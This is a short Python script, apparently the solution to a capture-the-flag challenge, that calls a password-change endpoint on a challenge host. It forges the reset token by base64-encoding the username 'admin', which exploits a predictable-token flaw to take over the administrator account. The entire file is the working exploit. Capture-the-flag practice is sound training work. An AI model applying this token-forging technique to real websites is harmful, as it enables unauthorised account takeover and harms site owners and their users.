#!/usr/bin/env python3
import requests
from base64 import b64encode
print(requests.get("http://password-changer.challs.olicyber.it/change-password.php?token="+b64encode("admin".encode()).decode()).text)
